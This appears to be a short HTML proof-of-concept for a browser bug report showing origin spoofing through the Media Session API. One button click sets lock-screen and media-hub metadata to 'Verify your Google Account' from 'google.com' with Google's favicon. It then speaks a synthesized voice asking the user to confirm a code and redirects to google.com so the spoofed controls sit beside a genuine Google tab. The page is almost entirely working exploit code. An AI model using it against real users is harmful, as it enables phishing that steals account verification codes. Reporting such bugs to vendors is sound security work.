<!doctype html><meta charset="utf-8"><title>Audio Origin Spoof - 2 mediasession metadata</title>
<!-- OBSERVE: open the OS media hub / lockscreen (or chrome://media-internals).
     Attacker-authored title + artist + artwork sit next to the google.com tab. -->
<button onclick="
  navigator.mediaSession.metadata = new MediaMetadata({
    title:  'Verify your Google Account',
    artist: 'google.com',
    album:  'Security Notice',
    artwork:[{src:'https://www.google.com/favicon.ico',sizes:'96x96',type:'image/x-icon'}]
  });
  const u = new SpeechSynthesisUtterance('Google security. Please confirm the code shown on your screen.');
  u.rate = 0.9; speechSynthesis.speak(u);
  setTimeout(() => { location.href = 'https://google.com'; }, 800);
"> Test </button>
